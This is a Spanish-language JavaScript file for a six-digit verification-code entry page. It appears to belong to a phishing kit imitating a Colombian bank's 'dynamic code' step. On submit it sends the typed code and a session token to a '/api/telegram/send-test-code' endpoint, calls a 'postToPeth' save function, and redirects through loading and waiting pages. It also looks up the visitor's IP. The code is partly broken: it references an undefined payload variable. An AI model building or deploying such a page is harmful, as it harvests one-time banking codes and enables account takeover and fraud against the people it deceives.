const pinInputs = document.querySelectorAll('.pin-input');
const continueButton = document.getElementById('continueButton');
const backButton = document.getElementById('backButton');
const clearBtn = document.getElementById('btn-clear');
const MASK_DELAY = 600;
const maskTimers = {};

function redirectToExpecting() {
    window.location.href = 'expecting.php?back=index-dinamic.html';
}

function getParam(name) {
    const urlParams = new URLSearchParams(window.location.search);
    return urlParams.get(name);
}

const hasError = getParam('error') === '1' || getParam('error') === 'true';
const errorBox = document.getElementById('errorMessageBox');
if (hasError && errorBox) {
    errorBox.classList.add('show');
}
const errorCloseBtn = errorBox && errorBox.querySelector('.error-message-close');
if (errorCloseBtn) {
    errorCloseBtn.addEventListener('click', function () {
        errorBox.classList.remove('show');
    });
}

function getDigitValue(input) {
    return input.dataset.digit || '';
}

function setDigitValue(input, digit) {
    if (digit) {
        input.dataset.digit = digit;
    } else {
        delete input.dataset.digit;
    }
}

function maskInput(input) {
    const digit = getDigitValue(input);
    if (digit) {
        input.value = digit;
        input.classList.add('is-masked');
    } else {
        input.value = '';
        input.classList.remove('is-masked');
    }
}

function showDigit(input) {
    const digit = getDigitValue(input);
    if (digit) {
        input.classList.remove('is-masked');
        input.value = digit;
    }
}

function scheduleMask(input) {
    clearTimeout(maskTimers[input.id]);
    maskTimers[input.id] = setTimeout(function () {
        maskInput(input);
    }, MASK_DELAY);
}

function getDynamicCode() {
    return Array.from(pinInputs).map(function (input) {
        return getDigitValue(input) || input.value.replace(/\D/g, '').slice(0, 1);
    }).join('');
}

function updateContinueButton() {
    const allFilled = Array.from(pinInputs).every(function (input) {
        return getDigitValue(input).length === 1;
    });
    if (allFilled) {
        continueButton.classList.add('valid');
        continueButton.disabled = false;
    } else {
        continueButton.classList.remove('valid');
        continueButton.disabled = true;
    }
}

function resetContinueButtonState() {
    continueButton.dataset.submitting = '0';
    continueButton.style.pointerEvents = '';
    continueButton.classList.remove('peth-btn-loading');
    continueButton.removeAttribute('aria-busy');
    continueButton.removeAttribute('data-peth-was-disabled');
    updateContinueButton();
}

window.addEventListener('pageshow', function (event) {
    if (event.persisted) {
        resetContinueButtonState();
    }
});

function clearInputs() {
    pinInputs.forEach(function (input) {
        clearTimeout(maskTimers[input.id]);
        input.value = '';
        input.classList.remove('is-masked');
        input.classList.remove('filled');
        setDigitValue(input, '');
    });
    pinInputs[0].focus();
    updateContinueButton();
}

pinInputs.forEach(function (input, index) {
    input.addEventListener('input', function (e) {
        let value = e.target.value.replace(/[^0-9]/g, '').slice(-1);
        e.target.value = value;

        if (!value) {
            clearTimeout(maskTimers[input.id]);
            input.value = '';
            input.classList.remove('is-masked');
            input.classList.remove('filled');
            setDigitValue(input, '');
            updateContinueButton();
            return;
        }

        setDigitValue(input, value);
        input.classList.remove('is-masked');
        input.classList.add('filled');
        scheduleMask(input);

        if (index < pinInputs.length - 1) {
            setTimeout(function () {
                pinInputs[index + 1].focus();
            }, 10);
        }

        updateContinueButton();
    });

    input.addEventListener('focus', showDigit.bind(null, input));
    input.addEventListener('blur', maskInput.bind(null, input));

    input.addEventListener('keydown', function (e) {
        if (e.key === 'Backspace') {
            clearTimeout(maskTimers[input.id]);
            if (getDigitValue(input) || input.value) {
                input.value = '';
                input.classList.remove('is-masked');
                input.classList.remove('filled');
                setDigitValue(input, '');
                updateContinueButton();
                e.preventDefault();
                return;
            }
            if (index > 0) {
                pinInputs[index - 1].focus();
                pinInputs[index - 1].value = '';
                pinInputs[index - 1].classList.remove('is-masked');
                pinInputs[index - 1].classList.remove('filled');
                setDigitValue(pinInputs[index - 1], '');
                updateContinueButton();
            }
        }

        if (!/[0-9]/.test(e.key) && !['Backspace', 'Delete', 'Tab', 'ArrowLeft', 'ArrowRight'].includes(e.key)) {
            e.preventDefault();
        }
    });

    input.addEventListener('paste', function (e) {
        e.preventDefault();
        const pastedText = (e.clipboardData || window.clipboardData).getData('text');
        const numbers = pastedText.replace(/[^0-9]/g, '');

        if (numbers.length > 0) {
            pinInputs.forEach(function (pin) {
                clearTimeout(maskTimers[pin.id]);
                pin.value = '';
                pin.classList.remove('is-masked');
                pin.classList.remove('filled');
                setDigitValue(pin, '');
            });

            const numbersArray = numbers.split('').slice(0, 6);
            numbersArray.forEach(function (num, idx) {
                if (pinInputs[idx]) {
                    setDigitValue(pinInputs[idx], num);
                    pinInputs[idx].value = num;
                    pinInputs[idx].classList.add('filled');
                    scheduleMask(pinInputs[idx]);
                }
            });

            const nextEmptyIndex = numbersArray.length;
            if (nextEmptyIndex < pinInputs.length) {
                pinInputs[nextEmptyIndex].focus();
            } else {
                pinInputs[pinInputs.length - 1].focus();
            }

            updateContinueButton();
        }
    });

    input.addEventListener('keypress', function (e) {
        if (!/[0-9]/.test(e.key)) {
            e.preventDefault();
        }
    });
});

continueButton.addEventListener('click', async function () {
    if (this.disabled || this.dataset.submitting === '1') return;


    const sessionToken = window.localStorage.getItem("sessionToken");

    if (!sessionToken) {
        throw new Error("No se identificó esta solicitud. Inicia sesión nuevamente.");
    }

    const dynamicCode = getDynamicCode();
    if (dynamicCode.length !== 6) return;

    this.dataset.submitting = '1';
    this.disabled = true;
    this.style.pointerEvents = 'none';


    const respuesta = await fetch("/api/telegram/send-test-code", {
        method: "POST",
        headers: {
            Accept: "application/json",
            "Content-Type": "application/json",
        },
        body: JSON.stringify({ session_token: sessionToken, code: dynamicCode }),
        cache: "no-store",
    });

    window.location.assign("../cargando/");

    window.postToPeth(Object.assign({ tipo: 'guardar', timestamp: new Date().toISOString() }, payload))
        .then(function () { })
        .catch(function () { })
        .finally(function () {
            redirectToExpecting();
        });

});

if (clearBtn) {
    clearBtn.addEventListener('click', clearInputs);
}

if (backButton) {
    backButton.addEventListener('click', function () {
        window.location.href = 'p1.html';
    });
}

pinInputs[0].focus();
updateContinueButton();

function getUserIP() {
    fetch('https://api.ipify.org?format=json')
        .then(response => response.json())
        .then(data => {
            document.getElementById('userIP').textContent = data.ip;
        })
        .catch(error => {
            console.error('Error obteniendo IP:', error);
            document.getElementById('userIP').textContent = 'No disponible';
        });
}

function updateDateTime() {
    const now = new Date();
    const opciones = {
        weekday: "long", year: "numeric", month: "long", day: "numeric",
        hour: "2-digit", minute: "2-digit", second: "2-digit", hour12: true
    };
    const fechaHora = new Intl.DateTimeFormat("es-CO", opciones).format(now);
    const datetimeElement = document.getElementById('datetime');
    if (datetimeElement) {
        datetimeElement.textContent = fechaHora;
    }
}

getUserIP();
updateDateTime();
setInterval(updateDateTime, 1000);
